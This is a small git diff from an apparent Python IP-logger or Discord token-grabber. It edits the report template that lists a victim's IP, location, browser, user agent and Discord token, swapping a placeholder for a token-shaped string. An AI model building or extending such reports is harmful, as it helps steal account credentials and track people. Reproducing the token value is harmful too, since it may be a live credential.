@@ -151,7 +151,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Browser:** `{browser}`
 
 **Token Discord:**
-> **Token:** `||s5fldskf9o31rs921enhg9u2917sdnhbmasddsf71872387sdbasn21u7tsdaasdhtgrhoilliooillop[hgjhgcxvdmmxsc761t24msndamshd712wlkkabyystrasasd7123jhlknlkfsdfsjASUHKSSADDdfsdrbdll83trksdfm||`
+> **Token:** `JSEGOGEzKDg4NzLyOTQ4Pzg2.EqBmfn.ILxg_eLl1LcglLEZ-15D684P7YE8t8n6sswfhP`
 
 **User Agent:**
 ```
